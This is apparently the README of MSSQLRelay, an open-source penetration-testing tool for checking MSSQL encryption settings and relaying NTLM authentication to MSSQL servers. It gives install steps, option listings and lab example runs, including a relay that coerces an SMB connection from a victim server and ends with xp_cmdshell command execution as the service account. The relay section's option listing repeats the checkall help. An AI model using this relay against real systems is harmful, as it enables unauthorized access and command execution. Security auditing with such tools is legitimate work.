# MSSQLRelay

[![Upload Python Package](https://github.com/compasssecurity/MSSQLRelay/actions/workflows/python-publish.yml/badge.svg)](https://github.com/compasssecurity/MSSQLRelay/actions/workflows/python-publish.yml)

Microsoft SQL Relay is an offensive tool for auditing and abusing Microsoft SQL (MSSQL) services.

## Installation

Install the dev branch of impacket, then install the mssqlrelay package:
```bash
pip3 install git+https://github.com/fortra/impacket.git
pip3 install git+https://github.com/CompassSecurity/mssqlrelay.git
```

## Usage

```bash
$ mssqlrelay       
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

usage: mssqlrelay [-v] [-h] [-debug] {check,checkall,relay} ...

Microsoft SQL Relaying Tool

positional arguments:
  {check,checkall,relay}
                        Action
    check               Check if server enforces encryption
    checkall            Lists MSSQL servers (from LDAP), check if user has access and encryption settings
    relay               NTLM Relay to MS SQL Endpoints

options:
  -v, --version         Show MSSQLRelay's version number and exit
  -h, --help            Show this help message and exit
  -debug                Turn debug output on
```

### Check

Run checks against a single server (target).
Returns information about the server and if encryption is enforced or not.

<details>
<summary><b>Options</b></summary>

```bash
$ mssqlrelay check -h                                                                                                                
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

usage: mssqlrelay check [-h] [-dc-ip ip address] [-target-ip ip address] [-target dns/ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-u username@domain] [-p password] [-hashes [LMHASH:]NTHASH] [-k] [-windows-auth] [-sspi] [-aes hex key] [-no-pass] [-mssql-port port] [-mssql-db db name]

options:
  -h, --help            show this help message and exit

connection options:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -target dns/ip address
                        DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -u username@domain, -username username@domain
                        Username. Format: username@domain
  -p password, -password password
                        Password
  -hashes [LMHASH:]NTHASH
                        NTLM hash, format is [LMHASH:]NTHASH
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -windows-auth         whether or not to use Windows Authentication (default True)
  -sspi                 Use Windows Integrated Authentication (SSPI)
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)
  -no-pass              Don't ask for password (useful for -k and -sspi)

MSSQL options:
  -mssql-port port      MSSQL port to log in to
  -mssql-db db name     MSSQL database instance (default None)
```
</details>

#### Typical usage
```bash
$ mssqlrelay check -target ws1.child.testlab.local -ns 10.0.1.100 -u tmassie@child.testlab.local -p 'Burp!=B33F' -windows-auth
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

[+] Trying to resolve 'ws1.child.testlab.local' at '10.0.1.100'
[+] Trying to resolve 'CHILD.TESTLAB.LOCAL' at '10.0.1.100'
[*] ws1.child.testlab.local (10.0.1.103:1433)
[*]   -  Version: Microsoft SQL Server 2019 RTM (15.0.2000)
[*]   -  Encryption: not enforced
[*]   -  Login: successful (as TMASSIE)
[*]   -  DB user: guest
[*]   -  Database: master
```

### CheckAll

Run checks against all MSSQL SPNs in the domain. Target is a domain controller.
Returns information about all servers and their configuration.

<details>
<summary><b>Options</b></summary>

```bash
$ mssqlrelay checkall -h
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

usage: mssqlrelay checkall [-h] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-target dns/ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-u username@domain] [-p password] [-hashes [LMHASH:]NTHASH] [-k] [-windows-auth] [-sspi] [-aes hex key] [-no-pass] [-mssql-port port]
                           [-mssql-db db name]

options:
  -h, --help            show this help message and exit

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -target dns/ip address
                        DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -u username@domain, -username username@domain
                        Username. Format: username@domain
  -p password, -password password
                        Password
  -hashes [LMHASH:]NTHASH
                        NTLM hash, format is [LMHASH:]NTHASH
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -windows-auth         whether or not to use Windows Authentication (default True)
  -sspi                 Use Windows Integrated Authentication (SSPI)
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)
  -no-pass              Don't ask for password (useful for -k and -sspi)

MSSQL options:
  -mssql-port port      MSSQL port to log in to
  -mssql-db db name     MSSQL database instance (default None)
```
</details>

#### Typical usage
```bash
$ mssqlrelay checkall -scheme ldap -target child.testlab.local -ns 10.0.1.100 -u tmassie@child.testlab.local -p 'Burp!=B33F' -windows-auth
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

[*] SPNs in domain CHILD.TESTLAB.LOCAL:
[*]   - MSSQLSvc/fs1.child.testlab.local:1433 (running as svc_sql)
[*]   - MSSQLSvc/ws1.child.testlab.local:1433 (running as svc_sql)
[*] Checking found instances ...
[*] fs1.child.testlab.local (10.0.1.101:1433)
[*]   -  Version: Microsoft SQL Server 2019 RTM (15.0.2000)
[*]   -  Encryption: enforced
[*]   -  Login: successful (as TMASSIE)
[*]   -  DB user: guest
[*]   -  Database: master
[*]   -  Privileges: ['xp_dirtree', 'xp_fileexist']
[*] ws1.child.testlab.local (10.0.1.103:1433)
[*]   -  Version: Microsoft SQL Server 2019 RTM (15.0.2000)
[*]   -  Encryption: not enforced
[*]   -  Login: successful (as TMASSIE)
[*]   -  DB user: guest
[*]   -  Database: master
```

### Relay

Connects to victim server (`-target`) as user (`-u`) to trigger SMB connection as service account to attacker (`attacker`) and relay to target server (`relaytarget`).

<details>
<summary><b>Options</b></summary>

```bash
$ mssqlrelay checkall -h
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

usage: mssqlrelay checkall [-h] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-target dns/ip address] [-ns nameserver] [-dns-tcp] [-timeout seconds] [-u username@domain] [-p password] [-hashes [LMHASH:]NTHASH] [-k] [-windows-auth] [-sspi] [-aes hex key] [-no-pass] [-mssql-port port]
                           [-mssql-db db name]

options:
  -h, --help            show this help message and exit

connection options:
  -scheme ldap scheme
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -target dns/ip address
                        DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -u username@domain, -username username@domain
                        Username. Format: username@domain
  -p password, -password password
                        Password
  -hashes [LMHASH:]NTHASH
                        NTLM hash, format is [LMHASH:]NTHASH
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -windows-auth         whether or not to use Windows Authentication (default True)
  -sspi                 Use Windows Integrated Authentication (SSPI)
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)
  -no-pass              Don't ask for password (useful for -k and -sspi)

MSSQL options:
  -mssql-port port      MSSQL port to log in to
  -mssql-db db name     MSSQL database instance (default None)
```
</details>

#### Typical usage
```bash
$ mssqlrelay relay -target fs1.child.testlab.local -u tmassie@child.testlab.local -p 'Burp!=B33F' ws1.child.testlab.local 10.0.1.15 
MSSQLRelay v1.0 - by Sylvain Heiniger (@sploutchy) / Compass Security (https://www.compass-security.com)

[*] Listening on 0.0.0.0:445
[*] Authenticating to victim 10.0.1.101
[*] Triggering connection to \\10.0.1.15\vKCIsdeX
[!] Press help for extra shell commands
SQL (child\svc_sql  dbo@master)> xp_cmdshell whoami
output          
-------------   
child\svc_sql   

NULL        
```

## Contact

Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter [@sploutchy](https://twitter.com/sploutchy).

## Credits

- [Alberto Solino](https://twitter.com/agsolino) and the whole team at impacket
- [Oliver Lyak](https://twitter.com/ly4k_) as I stole the project structure from [certipy](https://github.com/ly4k/Certipy)
- [Dirk-jan Mollema])(https://twitter.com/_dirkjan) for his great contributions to impacket